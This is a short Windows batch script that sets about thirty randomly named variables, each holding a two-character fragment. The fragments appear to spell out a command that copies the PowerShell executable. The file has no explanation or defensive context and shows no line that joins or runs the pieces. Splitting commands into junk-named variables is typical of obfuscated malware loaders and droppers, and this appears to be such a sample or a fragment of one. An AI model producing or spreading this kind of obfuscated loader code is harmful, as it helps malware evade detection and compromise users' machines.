@echo off
set "nkUCHNgLWF=do"
set "tCoEHKoUhP=rS"
set "PtQcKWoeCh=32"
set "uvvgTngZoS=we"
set "aiEOegqKwi=\v"
set "jJOnZXQzVP=em"
set "muMWkhRUtO=ow"
set "ZImhboZWiz=nd"
set "PqgItdJPsx=Sy"
set "UeZGOQewgF=po"
set "zpMWSOBaQZ= /"
set "ilqONhhSHy=ws"
set "LWXtLhSVgO=:\"
set "sqpQPiXVtV=0\"
set "dPneVpXZBd=py"
set "VOOqFLkkul=1."
set "CMuoRLCRoW=co"
set "WFJUWfBSJv=in"
set "xbBVGAnlkQ=\W"
set "YIlkMIUQJx=he"
set "ooMygsyies= C"
set "MdAykzmxia=y "
set "XpxkwWSRlM=xe"
set "dlFslMQkVA=ll"
set "BFPJiJSOZW=rs"
set "QcPgsaDhcw=Wi"
set "xbSMmlyGff=s\"
set "rktACoxoMz=we"
set "LJiTtoppyf=.e"
set "JFpeTkJVfE=Po"
set "hWNHBwpTWl=st"
